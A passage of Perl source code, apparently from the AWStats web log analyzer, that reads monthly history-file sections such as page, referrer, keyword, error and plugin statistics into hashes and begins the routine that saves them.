                                    }
                                    else {
                                        if (
                                            $countloaded < $MaxNbOf{'PageShown'}
                                                && $field[1] >= $MinHit{'File'} )
                                        {
                                            $loadrecord = 1;
                                        }
                                        $TotalDifferentPages++;
                                    }
                                }
                                else
                                { # This is for $HTMLOutput = urldetail, urlentry or urlexit
                                    if ( $MonthRequired eq 'all' ) {
                                        if (
                                            (
                                                !$FilterIn{'url'}
                                                    || $field[0] =~
                                                    /$FilterIn{'url'}/
                                            )
                                                && ( !$FilterEx{'url'}
                                                || $field[0] !~
                                                /$FilterEx{'url'}/ )
                                        )
                                        {
                                            $loadrecord = 1;
                                        }
                                    }
                                    else {
                                        if (
                                            (
                                                !$FilterIn{'url'}
                                                    || $field[0] =~
                                                    /$FilterIn{'url'}/
                                            )
                                                && ( !$FilterEx{'url'}
                                                || $field[0] !~
                                                /$FilterEx{'url'}/ )
                                                && $field[1] >= $MinHit{'File'}
                                        )
                                        {
                                            $loadrecord = 1;
                                        }
                                        $TotalDifferentPages++;
                                    }
                                }

                                # Posssibilite de mettre if ($FilterIn{'url'} && $field[0] =~ /$FilterIn{'url'}/) mais il faut gerer TotalPages de la meme maniere
                                $TotalBytesPages += ( $field[2] || 0 );
                                $TotalEntries    += ( $field[3] || 0 );
                                $TotalExits      += ( $field[4] || 0 );
                            }
                            if ($loadrecord) {
                                if ( $field[1] ) {
                                    $_url_p{ $field[0] } += $field[1];
                                }
                                if ( $field[2] ) {
                                    $_url_k{ $field[0] } += $field[2];
                                }
                                if ( $field[3] ) {
                                    $_url_e{ $field[0] } += $field[3];
                                }
                                if ( $field[4] ) {
                                    $_url_x{ $field[0] } += $field[4];
                                }
                                $countloaded++;
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_SIDER'
                    || $field[0] eq "${xmleb}END_SIDER"
                    || !$_ );
                if (   $field[0] ne 'END_SIDER'
                    && $field[0] ne "${xmleb}END_SIDER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section SIDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of SIDER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'sider'};

                # WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
                #if ($SectionsToSave{'sider'}) {
                #	Save_History('sider',$year,$month,$date); delete $SectionsToSave{'sider'};
                #	if ($withpurge) { %_url_p=(); %_url_k=(); %_url_e=(); %_url_x=(); }
                #}
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_FILETYPES
            if ( $field[0] eq 'BEGIN_FILETYPES' ) {
                if ($Debug) { debug(" Begin of FILETYPES section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'filetypes'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_filetypes_h{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_filetypes_k{ $field[0] } += $field[2];
                            }
                            if ( $field[3] ) {
                                $_filetypes_gz_in{ $field[0] } += $field[3];
                            }
                            if ( $field[4] ) {
                                $_filetypes_gz_out{ $field[0] } += $field[4];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_FILETYPES'
                    || $field[0] eq "${xmleb}END_FILETYPES"
                    || !$_ );
                if (   $field[0] ne 'END_FILETYPES'
                    && $field[0] ne "${xmleb}END_FILETYPES" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section FILETYPES not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of FILETYPES section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'filetypes'};
                if ( $SectionsToSave{'filetypes'} ) {
                    Save_History( 'filetypes', $year, $month, $date );
                    delete $SectionsToSave{'filetypes'};
                    if ($withpurge) {
                        %_filetypes_h      = ();
                        %_filetypes_k      = ();
                        %_filetypes_gz_in  = ();
                        %_filetypes_gz_out = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_DOWNLOADS
            if ( $field[0] eq 'BEGIN_DOWNLOADS' ) {
                if ($Debug) {
                    debug(" Begin of DOWNLOADS section");
                }
                $field[0] = '';
                my $count       = 0;
                my $counttoload = int($field[1]);
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'downloads'}) {
                            $countloaded++;
                            $_downloads{$field[0]}->{'AWSTATS_HITS'} += int( $field[1] );
                            $_downloads{$field[0]}->{'AWSTATS_206'} += int( $field[2] );
                            $_downloads{$field[0]}->{'AWSTATS_SIZE'} += int( $field[3] );
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_DOWNLOADS'
                    || $field[0] eq "${xmleb}END_DOWNLOADS"
                    || !$_ );
                if (   $field[0] ne 'END_DOWNLOADS'
                    && $field[0] ne "${xmleb}END_DOWNLOADS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section DOWNLOADS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of DOWNLOADS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'downloads'};
                if ( $SectionsToSave{'downloads'} ) {
                    Save_History( 'downloads',
                        $year, $month, $date );
                    delete $SectionsToSave{'downloads'};
                    if ($withpurge) { %_downloads = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SEREFERRALS
            if ( $field[0] eq 'BEGIN_SEREFERRALS' ) {
                if ($Debug) { debug(" Begin of SEREFERRALS section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'sereferrals'} ) {
                            $countloaded++;
                            if ( $versionnum < 5004 )
                            {    # For history files < 5.4
                                my $se = $field[0];
                                $se =~ s/\./\\./g;
                                if ( $SearchEnginesHashID{$se} ) {
                                    $_se_referrals_h{ $SearchEnginesHashID{$se}
                                    } += $field[1]
                                        || 0;
                                }
                                else {
                                    $_se_referrals_h{ $field[0] } += $field[1]
                                        || 0;
                                }
                            }
                            elsif ( $versionnum < 5091 )
                            {    # For history files < 5.91
                                my $se = $field[0];
                                $se =~ s/\./\\./g;
                                if ( $SearchEnginesHashID{$se} ) {
                                    $_se_referrals_p{ $SearchEnginesHashID{$se}
                                    } += $field[1]
                                        || 0;
                                    $_se_referrals_h{ $SearchEnginesHashID{$se}
                                    } += $field[2]
                                        || 0;
                                }
                                else {
                                    $_se_referrals_p{ $field[0] } += $field[1]
                                        || 0;
                                    $_se_referrals_h{ $field[0] } += $field[2]
                                        || 0;
                                }
                            }
                            else {
                                if ( $field[1] ) {
                                    $_se_referrals_p{ $field[0] } += $field[1];
                                }
                                if ( $field[2] ) {
                                    $_se_referrals_h{ $field[0] } += $field[2];
                                }
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_SEREFERRALS'
                    || $field[0] eq "${xmleb}END_SEREFERRALS"
                    || !$_ );
                if (   $field[0] ne 'END_SEREFERRALS'
                    && $field[0] ne "${xmleb}END_SEREFERRALS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section SEREFERRALS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of SEREFERRALS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'sereferrals'};
                if ( $SectionsToSave{'sereferrals'} ) {
                    Save_History( 'sereferrals', $year, $month, $date );
                    delete $SectionsToSave{'sereferrals'};
                    if ($withpurge) {
                        %_se_referrals_p = ();
                        %_se_referrals_h = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_PAGEREFS
            if ( $field[0] eq 'BEGIN_PAGEREFS' ) {
                if ($Debug) { debug(" Begin of PAGEREFS section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'pagerefs'} ) {
                            my $loadrecord = 0;
                            if ($withupdate) {
                                $loadrecord = 1;
                            }
                            else {
                                if (
                                    (
                                        !$FilterIn{'refererpages'}
                                            || $field[0] =~
                                            /$FilterIn{'refererpages'}/
                                    )
                                        && ( !$FilterEx{'refererpages'}
                                        || $field[0] !~
                                        /$FilterEx{'refererpages'}/ )
                                )
                                {
                                    $loadrecord = 1;
                                }
                            }
                            if ($loadrecord) {
                                if ( $versionnum < 5004 )
                                {    # For history files < 5.4
                                    if ( $field[1] ) {
                                        $_pagesrefs_h{ $field[0] } +=
                                            int( $field[1] );
                                    }
                                }
                                else {
                                    if ( $field[1] ) {
                                        $_pagesrefs_p{ $field[0] } +=
                                            int( $field[1] );
                                    }
                                    if ( $field[2] ) {
                                        $_pagesrefs_h{ $field[0] } +=
                                            int( $field[2] );
                                    }
                                }
                                $countloaded++;
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_PAGEREFS'
                    || $field[0] eq "${xmleb}END_PAGEREFS"
                    || !$_ );
                if (   $field[0] ne 'END_PAGEREFS'
                    && $field[0] ne "${xmleb}END_PAGEREFS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section PAGEREFS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of PAGEREFS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'pagerefs'};
                if ( $SectionsToSave{'pagerefs'} ) {
                    Save_History( 'pagerefs', $year, $month, $date );
                    delete $SectionsToSave{'pagerefs'};
                    if ($withpurge) { %_pagesrefs_p = (); %_pagesrefs_h = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SEARCHWORDS
            if ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {
                if ($Debug) {
                    debug(
                        " Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})"
                    );
                }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'searchwords'} ) {
                            my $loadrecord = 0;
                            if ($withupdate) {
                                $loadrecord = 1;
                            }
                            else {
                                if ( $HTMLOutput{'main'} ) {
                                    if ( $MonthRequired eq 'all' ) {
                                        $loadrecord = 1;
                                    }
                                    else {
                                        if ( $countloaded <
                                            $MaxNbOf{'KeyphrasesShown'}
                                            && $field[1] >=
                                            $MinHit{'Keyphrase'} )
                                        {
                                            $loadrecord = 1;
                                        }
                                        $TotalDifferentKeyphrases++;
                                        $TotalKeyphrases += ( $field[1] || 0 );
                                    }
                                }
                                elsif ( $HTMLOutput{'keyphrases'} )
                                {    # Load keyphrases for keyphrases chart
                                    if ( $MonthRequired eq 'all' ) {
                                        $loadrecord = 1;
                                    }
                                    else {
                                        if ( $field[1] >= $MinHit{'Keyphrase'} )
                                        {
                                            $loadrecord = 1;
                                        }
                                        $TotalDifferentKeyphrases++;
                                        $TotalKeyphrases += ( $field[1] || 0 );
                                    }
                                }
                                if ( $HTMLOutput{'keywords'} )
                                {    # Load keyphrases for keywords chart
                                    $loadrecord = 2;
                                }
                            }
                            if ($loadrecord) {
                                if ( $field[1] ) {
                                    if ( $loadrecord == 2 ) {
                                        foreach ( split( /\+/, $field[0] ) )
                                        {    # field[0] is "val1+val2+..."
                                            $_keywords{$_} += $field[1];
                                        }
                                    }
                                    else {
                                        $_keyphrases{ $field[0] } += $field[1];
                                    }
                                }
                                $countloaded++;
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_SEARCHWORDS'
                    || $field[0] eq "${xmleb}END_SEARCHWORDS"
                    || !$_ );
                if (   $field[0] ne 'END_SEARCHWORDS'
                    && $field[0] ne "${xmleb}END_SEARCHWORDS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section SEARCHWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of SEARCHWORDS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'searchwords'};
                if ( $SectionsToSave{'searchwords'} ) {
                    Save_History( 'searchwords', $year, $month, $date );
                    delete $SectionsToSave{ 'searchwords'
                    };    # This save searwords and keywords sections
                    if ($withpurge) { %_keyphrases = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_KEYWORDS
            if ( $field[0] eq 'BEGIN_KEYWORDS' ) {
                if ($Debug) {
                    debug(
                        " Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})"
                    );
                }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'keywords'} ) {
                            my $loadrecord = 0;
                            if ( $MonthRequired eq 'all' ) { $loadrecord = 1; }
                            else {
                                if (   $countloaded < $MaxNbOf{'KeywordsShown'}
                                    && $field[1] >= $MinHit{'Keyword'} )
                                {
                                    $loadrecord = 1;
                                }
                                $TotalDifferentKeywords++;
                                $TotalKeywords += ( $field[1] || 0 );
                            }
                            if ($loadrecord) {
                                if ( $field[1] ) {
                                    $_keywords{ $field[0] } += $field[1];
                                }
                                $countloaded++;
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_KEYWORDS'
                    || $field[0] eq "${xmleb}END_KEYWORDS"
                    || !$_ );
                if (   $field[0] ne 'END_KEYWORDS'
                    && $field[0] ne "${xmleb}END_KEYWORDS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section KEYWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of KEYWORDS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'keywords'};
                if ( $SectionsToSave{'keywords'} ) {
                    Save_History( 'keywords', $year, $month, $date );
                    delete $SectionsToSave{'keywords'};
                    if ($withpurge) { %_keywords = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_ERRORS
            if ( $field[0] eq 'BEGIN_ERRORS' ) {
                if ($Debug) { debug(" Begin of ERRORS section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'errors'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_errors_h{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_errors_k{ $field[0] } += $field[2];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_ERRORS'
                    || $field[0] eq "${xmleb}END_ERRORS"
                    || !$_ );
                if (   $field[0] ne 'END_ERRORS'
                    && $field[0] ne "${xmleb}END_ERRORS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section ERRORS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of ERRORS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'errors'};
                if ( $SectionsToSave{'errors'} ) {
                    Save_History( 'errors', $year, $month, $date );
                    delete $SectionsToSave{'errors'};
                    if ($withpurge) { %_errors_h = (); %_errors_k = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SIDER_xxx
            foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
                if ( $field[0] eq "BEGIN_SIDER_$code" ) {
                    if ($Debug) { debug(" Begin of SIDER_$code section"); }
                    $field[0] = '';
                    my $count       = 0;
                    my $countloaded = 0;
                    do {
                        if ( $field[0] ) {
                            $count++;
                            if ( $SectionsToLoad{"sider_$code"} ) {
                                $countloaded++;
                                if ( $field[1] ) {
                                    $_sider_h{$code}{$field[0]} += $field[1];
                                }
                                if ( $withupdate || $HTMLOutput{"errors$code"} )
                                {
                                    my $fieldidx = 2;
                                    foreach (split(//, $ShowHTTPErrorsPageDetail)) {
                                        last if (! $field[$fieldidx] );
                                        if ( $_ =~ /R/i ) {
                                            $_referer_h{$code}{$field[0]} = $field[2];
                                        } elsif ( $_ =~ /H/i ) {
                                            $_err_host_h{$code}{$field[0]} = $field[$fieldidx];
                                        }
                                        $fieldidx++;
                                    }
                                }
                            }
                        }
                        $_ = <HISTORY>;
                        chomp $_;
                        s/\r//;
                        @field = split(
                            /\s+/,
                            (
                                $readxml
                                    ? XMLDecodeFromHisto($_)
                                    : $_
                            )
                        );
                        $countlines++;
                    } until ( $field[0] eq "END_SIDER_$code"
                        || $field[0] eq "${xmleb}END_SIDER_$code"
                        || !$_ );
                    if (   $field[0] ne "END_SIDER_$code"
                        && $field[0] ne "${xmleb}END_SIDER_$code" )
                    {
                        error(
                            "History file \"$filetoread\" is corrupted (End of section SIDER_$code not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                            "", "", 1
                        );
                    }
                    if ($Debug) {
                        debug(
                            " End of SIDER_$code section ($count entries, $countloaded loaded)"
                        );
                    }
                    delete $SectionsToLoad{"sider_$code"};
                    if ( $SectionsToSave{"sider_$code"} ) {
                        Save_History( "sider_$code", $year, $month, $date );
                        delete $SectionsToSave{"sider_$code"};
                        if ($withpurge) {
                            %{$_sider_h{$code}} = ();
                            %{$_referer_h{$code}} = ();
                            %{$_err_host_h{$code}} = ();
                        }
                    }
                    if ( !scalar %SectionsToLoad ) {
                        debug(" Stop reading history file. Got all we need.");
                        last;
                    }
                    next;
                }
            }

            # BEGIN_EXTRA_xxx
            foreach my $extranum ( 1 .. @ExtraName - 1 ) {
                if ( $field[0] eq "BEGIN_EXTRA_$extranum" ) {
                    if ($Debug) { debug(" Begin of EXTRA_$extranum"); }
                    $field[0] = '';
                    my $count       = 0;
                    my $countloaded = 0;
                    do {
                        if ( $field[0] ne '' ) {
                            $count++;
                            if ( $SectionsToLoad{"extra_$extranum"} ) {
                                if (   $ExtraStatTypes[$extranum] =~ /P/i
                                    && $field[1] )
                                {
                                    ${ '_section_' . $extranum . '_p' }
                                        { $field[0] } += $field[1];
                                }
                                ${ '_section_' . $extranum . '_h' }
                                    { $field[0] } += $field[2];
                                if (   $ExtraStatTypes[$extranum] =~ /B/i
                                    && $field[3] )
                                {
                                    ${ '_section_' . $extranum . '_k' }
                                        { $field[0] } += $field[3];
                                }
                                if ( $ExtraStatTypes[$extranum] =~ /L/i
                                    && !${ '_section_' . $extranum . '_l' }
                                    { $field[0] }
                                    && $field[4] )
                                {
                                    ${ '_section_' . $extranum . '_l' }
                                        { $field[0] } = int( $field[4] );
                                }
                                $countloaded++;
                            }
                        }
                        $_ = <HISTORY>;
                        chomp $_;
                        s/\r//;
                        @field = split(
                            /\s+/,
                            (
                                $readxml
                                    ? XMLDecodeFromHisto($_)
                                    : $_
                            )
                        );
                        $countlines++;
                    } until ( $field[0] eq "END_EXTRA_$extranum"
                        || $field[0] eq "${xmleb}END_EXTRA_$extranum"
                        || !$_ );
                    if (   $field[0] ne "END_EXTRA_$extranum"
                        && $field[0] ne "${xmleb}END_EXTRA_$extranum" )
                    {
                        error(
                            "History file \"$filetoread\" is corrupted (End of section EXTRA_$extranum not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                            "", "", 1
                        );
                    }
                    if ($Debug) {
                        debug(
                            " End of EXTRA_$extranum section ($count entries, $countloaded loaded)"
                        );
                    }
                    delete $SectionsToLoad{"extra_$extranum"};
                    if ( $SectionsToSave{"extra_$extranum"} ) {
                        Save_History( "extra_$extranum", $year, $month, $date );
                        delete $SectionsToSave{"extra_$extranum"};
                        if ($withpurge) {
                            %{ '_section_' . $extranum . '_p' } = ();
                            %{ '_section_' . $extranum . '_h' } = ();
                            %{ '_section_' . $extranum . '_b' } = ();
                            %{ '_section_' . $extranum . '_l' } = ();
                        }
                    }
                    if ( !scalar %SectionsToLoad ) {
                        debug(" Stop reading history file. Got all we need.");
                        last;
                    }
                    next;
                }
            }

            # BEGIN_PLUGINS
            if (   $AtLeastOneSectionPlugin
                && $field[0] =~ /^BEGIN_PLUGIN_(\w+)$/i )
            {
                my $pluginname = $1;
                my $found      = 0;
                foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
                    if ( $pluginname eq $_ ) {

                        # The plugin for this section was loaded
                        $found = 1;
                        my $issectiontoload =
                            $SectionsToLoad{"plugin_$pluginname"};

                        #               		    my $function="SectionReadHistory_$pluginname(\$issectiontoload,\$readxml,\$xmleb,\$countlines)";
                        #               		    eval("$function");
                        my $function = "SectionReadHistory_$pluginname";
                        &$function( $issectiontoload, $readxml, $xmleb,
                            $countlines );
                        delete $SectionsToLoad{"plugin_$pluginname"};
                        if ( $SectionsToSave{"plugin_$pluginname"} ) {
                            Save_History( "plugin_$pluginname",
                                $year, $month, $date );
                            delete $SectionsToSave{"plugin_$pluginname"};
                            if ($withpurge) {

                                #                           		my $function="SectionInitHashArray_$pluginname()";
                                #                           		eval("$function");
                                my $function =
                                    "SectionInitHashArray_$pluginname";
                                &$function();
                            }
                        }
                        last;
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }

                # The plugin for this section was not loaded
                if ( !$found ) {
                    do {
                        $_ = <HISTORY>;
                        chomp $_;
                        s/\r//;
                        @field = split(
                            /\s+/,
                            (
                                $readxml
                                    ? XMLDecodeFromHisto($_)
                                    : $_
                            )
                        );
                        $countlines++;
                    } until ( $field[0] eq "END_PLUGIN_$pluginname"
                        || $field[0] eq "${xmleb}END_PLUGIN_$pluginname"
                        || !$_ );
                }
                next;
            }

            # For backward compatibility (ORIGIN section was "HitFromx" in old history files)
            if ( $SectionsToLoad{'origin'} ) {
                if ( $field[0] eq 'HitFrom0' ) {
                    $_from_p[0] += 0;
                    $_from_h[0] += $field[1];
                    next;
                }
                if ( $field[0] eq 'HitFrom1' ) {
                    $_from_p[1] += 0;
                    $_from_h[1] += $field[1];
                    next;
                }
                if ( $field[0] eq 'HitFrom2' ) {
                    $_from_p[2] += 0;
                    $_from_h[2] += $field[1];
                    next;
                }
                if ( $field[0] eq 'HitFrom3' ) {
                    $_from_p[3] += 0;
                    $_from_h[3] += $field[1];
                    next;
                }
                if ( $field[0] eq 'HitFrom4' ) {
                    $_from_p[4] += 0;
                    $_from_h[4] += $field[1];
                    next;
                }
                if ( $field[0] eq 'HitFrom5' ) {
                    $_from_p[5] += 0;
                    $_from_h[5] += $field[1];
                    next;
                }
            }
        }
    }

    if ($withupdate) {

        # Process rest of data saved in 'wait' arrays (data for hosts that are not in history file or no history file found)
        # This can change some values for day, sider and session sections
        if ($Debug) { debug( " Processing data in 'wait' arrays", 3 ); }
        foreach ( keys %_waithost_e ) {
            if ($Debug) {
                debug( "  Visit in 'wait' array for $_ is a new visit", 4 );
            }
            my $newtimehosts =
                ( $_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_} );
            my $newtimehostl =
                ( $_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_} );
            $_url_e{ $_waithost_e{$_} }++;
            $newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
            $DayVisits{$1}++;
            if ( $_waithost_s{$_} ) {

                # There was also a second session in processed log
                $_session{ GetSessionRange( $newtimehosts, $newtimehostl ) }++;
            }
        }
    }

    # Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)
    if ($Debug) {
        debug(
            " Check and write all unwrote sections: "
                . join( ',', keys %SectionsToSave ),
            2
        );
    }
    foreach my $key (
        sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
            keys %SectionsToSave
    )
    {
        Save_History( "$key", $year, $month, $date, $lastlinenb,
            $lastlineoffset, $lastlinechecksum );
    }
    %SectionsToSave = ();

    # Update offset in map section and last data in general section then close files
    if ($withupdate) {
        if ($xml) { print HISTORYTMP "\n\n</xml>\n"; }

        # Update offset of sections in the MAP section
        foreach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )
        {
            if ($Debug) {
                debug(
                    " Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}"
                );
            }
            if ( $PosInFile{"$_"} ) {
                seek( HISTORYTMP, $PosInFile{"$_"}, 0 );
                print HISTORYTMP $ValueInFile{"$_"};
            }
        }

        # Save last data in general sections
        if ($Debug) {
            debug(
                " Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}"
            );
        }
        seek( HISTORYTMP, $PosInFile{"TotalVisits"}, 0 );
        print HISTORYTMP $MonthVisits{ $year . $month };
        if ($Debug) {
            debug(
                " Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}"
            );
        }
        seek( HISTORYTMP, $PosInFile{"TotalUnique"}, 0 );
        print HISTORYTMP $MonthUnique{ $year . $month };
        if ($Debug) {
            debug(
                " Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}"
            );
        }
        seek( HISTORYTMP, $PosInFile{"MonthHostsKnown"}, 0 );
        print HISTORYTMP $MonthHostsKnown{ $year . $month };
        if ($Debug) {
            debug(
                " Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}"
            );
        }
        seek( HISTORYTMP, $PosInFile{"MonthHostsUnknown"}, 0 );
        print HISTORYTMP $MonthHostsUnknown{ $year . $month };
        close(HISTORYTMP) || error("Failed to write temporary history file");
    }
    if ($withread) {
        close(HISTORY) || error("Command for pipe '$filetoread' failed");
    }

    # Purge data
    if ($withpurge) { &Init_HashArray(); }

    # If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed
    if ($withupdate) {
        if ( $HistoryAlreadyFlushed{"$year$month$day$hour"} ) {
            debug(
                "Rename tmp history file bis '$filetoread' to '$filetowrite'");
            if ( rename( $filetowrite, $filetoread ) == 0 ) {
                error("Failed to update tmp history file $filetoread");
            }
        }
        else {
            $HistoryAlreadyFlushed{"$year$month$day$hour"} = 1;
        }

        if ( !$ListOfYears{"$year"} || $ListOfYears{"$year"} lt "$month" ) {
            $ListOfYears{"$year"} = "$month";
        }
    }

    # For backward compatibility, if LastLine does not exist, set to LastTime
    $LastLine ||= $LastTime{$date};

    return ( $withupdate ? "$filetowrite" : "" );
}

#------------------------------------------------------------------------------
# Function:		Save a part of history file
# Parameters:	sectiontosave,year,month,breakdate[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:		$VERSION HISTORYTMP $nowyear $nowmonth $nowday $nowhour $nowmin $nowsec $LastLineNumber $LastLineOffset $LastLineChecksum
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub Save_History {
    my $sectiontosave = shift || '';
    my $year          = shift || '';
    my $month         = shift || '';
    my $breakdate     = shift || '';

    my $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
    my (
